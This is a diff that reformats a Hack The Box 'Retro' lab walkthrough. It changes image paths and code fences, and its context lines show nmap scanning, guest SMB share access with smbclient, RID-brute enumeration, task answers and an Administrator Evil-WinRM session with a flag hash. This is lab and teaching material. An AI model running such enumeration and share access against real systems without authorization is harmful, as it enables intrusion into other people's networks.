@@ -1,5 +1,5 @@
 <div align="center">
-<img src="img/Pasted image 20250705213732.png">
+<img src="Pasted image 20250705213732.png">
 </div>
 
 ### Guided Mode
@@ -14,9 +14,8 @@ Now let's perform our nmap scan. Per my usual,
 ```
 nmap -sV -sC -Pn -T4 10.129.196.125
 ```
-
-
-```Host is up (0.12s latency).
+```
+`Host is up (0.12s latency).`
 `Not shown: 988 filtered tcp ports (no-response)`
 `PORT     STATE SERVICE       VERSION`
 `53/tcp   open  domain        Simple DNS Plus`
@@ -76,6 +75,7 @@ nmap -sV -sC -Pn -T4 10.129.196.125
 `Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .`
 `Nmap done: 1 IP address (1 host up) scanned in 100.55 seconds`
 `~/hackthebox/Retro >`
+```
 
 So to answer our question **task 1** DC.retro.vl
 Let's add this to /etc/hosts
@@ -95,7 +95,7 @@ smbclient -L \\10.129.196.125\
 ```
 
 <div align="center">
-<img src="img/Pasted image 20250705215111.png">
+<img src="Pasted image 20250705215111.png">
 </div>
 
 So **task 2**: Trainees
@@ -109,11 +109,11 @@ smbclient \\\\\\10.129.196.125\\Trainees -U 'guest'
 ```
 
 <div align="center">
-<img src="img/Pasted image 20250705215450.png">
+<img src="Pasted image 20250705215450.png">
 </div>
 
 <div align="center">
-<img src="img/Pasted image 20250705220254.png">
+<img src="Pasted image 20250705220254.png">
 </div>
 ... so there seems to be no clear indication of a "username" located here. Let's enumerate the smb server via rid-brute since we have guest access.
 
@@ -179,7 +179,7 @@ SMB         10.129.196.125  445    DC               Trainees        READ
 
 So our answer for **task 5** is Notes. Connecting to this share will reveal our first flag.
 <div align="center">
-<img src="img/Pasted image 20250705223907.png">
+<img src="Pasted image 20250705223907.png">
 </div>
 
 Enter user.txt flag (**Task 6**) and let's read the contents of ToDo.txt
@@ -421,4 +421,5 @@ Mode                 LastWriteTime         Length Name
 40fce9c3f09024bcab29d377ee1ed071
 *Evil-WinRM* PS C:\Users\Administrator\Desktop>
 ```
+
 ...and we've succesfully rooted Retro. 
